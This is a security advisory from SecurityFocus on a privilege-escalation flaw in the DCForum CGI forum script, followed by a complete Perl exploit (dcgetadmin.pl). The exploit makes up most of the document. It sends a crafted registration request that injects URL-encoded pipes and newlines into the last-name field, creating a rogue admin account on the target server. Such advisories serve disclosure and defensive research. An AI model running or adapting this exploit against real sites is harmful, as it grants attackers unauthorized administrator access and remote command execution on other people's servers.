source: http://www.securityfocus.com/bid/2728/info

DCForum is a commercial cgi script from DCScripts which is designed to facilitate web-based threaded discussion forums.

Versions of DCForum are vulnerable to attacks which can yield an elevation of privileges and remote execution of arbitrary commands.

DCForum maintains a file containing its user account information, including hashed user passwords and other potentially sensitive information.

When a new user account is created, the user's information is written to this file. Fields within each record are delimited by pipe ('|') and newline characters.

DCForum fails to properly validate this user-supplied account information. As a result, an attacker can cause a corruption of the script's user records by providing a value for the last name field which includes URL-encoded pipes and newlines. By appending desired values to the last name field, an attacker can insert account information for a new user, and specify admin privileges.

This newly-created admin account allows a remote attacker to issue arbitrary commands with the privilege level of the webserver process. 

#!/usr/bin/perl

# dcgetadmin.pl - (C) 2001 Franklin DeMatto - franklin@qDefense.com


use Getopt::Std;
use IO::Socket;

getopts ('ap');

usage () unless ($#ARGV == 0 || $#ARGV == 1);
if ($opt_a) { print "\n -a not implemented yet\n\n"; exit 1; }

$host = $ARGV[0];
$uri =  $ARGV[1] ? $ARGV[1] : '/cgi-bin/dcforum/dcboard.cgi';

$username = 'evilhacker' .  ( int rand(9899) + 100); 
$password = int rand  (9899) + 100;
$hash = $opt_p ? $password : crypt ($password, substr ($password, 0, 2));
$dummyuser = 'not' . ( int rand(9899) + 100) ;
$dummypass = int rand (9899) + 100;

print "\n(Debugging info: Hash = $hash    Dummyuser = $dummyuser    Dummypass =
$dummypass)\n";
print "Attempting to register username $username with password $password as admin . . .\n";

$sock = IO::Socket::INET->new("$host:80") or die "Unable to connect to $host: $!\n\n";
$req = "GET
$uri?command=register&az=user_register&Username=$dummyuser&Password=$dummypass&dup_Password=$dummypass";
$req .=
"&Firstname=Proof&Lastname=Concept%0a$hash%7c$username%7cadmin%7cProof%7cConcept&EMail=nothere%40nomail.com";
$req .= "&required=Password%2cUsername%2cFirstname%2cLastname%2cEMail HTTP/1.0\015\012";
$req .= "Host: $host\015\012\015\012";

print $sock $req;

print "The server replied:\n\n";

while (<$sock>)
{
  if (/BODY/) { $in_body = 1; }
  next unless $in_body;
  if (/form|<\/BODY>/) { last; }
  s/<.+?>//g;
  print $_ unless (/^\s*$/);
}
  print "\nNote: Even if your password is supposed to be e-mailed to you, it should work
right away.\n";


sub usage
{
  print <<EOF;
dcgetadmin.pl - (C) 2001 Franklin DeMatto - franklin\@qDefense.com

Usage: $0 [options] host [path to dcboard.cgi]

Options:
   -a to activate the account (for sites that do not activate automatically)
  NOTE: This option is not yet supported, but should be quite easy to add if you need it
  
  -p to leave the password in plaintext (necessary when the target is NT)

The path to dcboard.cgi, if not supplied, is assumed to be /cgi-bin/dcforum/dcboard.cgi

EOF
  exit 1;
}